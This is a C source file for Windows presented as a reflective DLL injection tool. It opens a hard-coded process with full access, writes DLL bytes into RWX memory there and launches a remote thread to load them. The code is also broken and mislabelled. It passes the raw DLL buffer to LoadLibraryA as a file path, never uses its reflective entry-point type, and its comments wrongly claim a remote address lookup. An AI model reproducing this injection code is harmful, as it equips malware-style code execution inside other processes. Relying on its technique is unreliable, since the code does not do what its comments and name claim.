#include <windows.h>
#include <stdio.h>

typedef BOOL(WINAPI* ReflectiveDllMain)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);

BOOL PerformReflectiveDLLInjection(DWORD dwProcessId, BYTE* pDllBuffer, DWORD dwDllSize)
{
    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == NULL)
    {
        printf("Failed to open the target process.\n");
        return FALSE;
    }

    // Allocate memory in the target process for the DLL
    LPVOID pRemoteDll = VirtualAllocEx(hProcess, NULL, dwDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteDll == NULL)
    {
        printf("Failed to allocate memory in the target process.\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write the DLL content to the allocated memory in the target process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteDll, pDllBuffer, dwDllSize, &bytesWritten) || bytesWritten != dwDllSize)
    {
        printf("Failed to write the DLL to the target process memory.\n");
        VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Get the base address of kernel32.dll in the target process
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL)
    {
        printf("Failed to get the base address of kernel32.dll in the target process.\n");
        VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Get the address of LoadLibraryA function in kernel32.dll
    FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibraryA == NULL)
    {
        printf("Failed to get the address of LoadLibraryA function.\n");
        VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create a remote thread in the target process to execute the ReflectiveDllMain function
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteDll, 0, NULL);
    if (hThread == NULL)
    {
        printf("Failed to create a remote thread in the target process.\n");
        VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Get the exit code of the remote thread
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return exitCode != 0;
}

int main()
{
    // Replace with the target process ID where you want to inject and execute the DLL
    DWORD dwTargetProcessId = 23328;

    // Read the custom DLL content from file
    FILE* pFile = fopen("mydll.dll", "rb");
    if (pFile == NULL)
    {
        printf("Failed to open the custom DLL file.\n");
        return 1;
    }

    fseek(pFile, 0, SEEK_END);
    long fileSize = ftell(pFile);
    fseek(pFile, 0, SEEK_SET);

    BYTE* pDllBuffer = (BYTE*)malloc(fileSize);
    if (pDllBuffer == NULL)
    {
        printf("Failed to allocate memory for DLL buffer.\n");
        fclose(pFile);
        return 1;
    }

    fread(pDllBuffer, 1, fileSize, pFile);
    fclose(pFile);

    // Perform reflective DLL injection and execution
    if (!PerformReflectiveDLLInjection(dwTargetProcessId, pDllBuffer, fileSize))
    {
        printf("Failed to perform reflective DLL injection.\n");
        free(pDllBuffer);
        return 1;
    }

    printf("Reflective DLL injection and execution succeeded.\n");

    free(pDllBuffer);
    return 0;
}
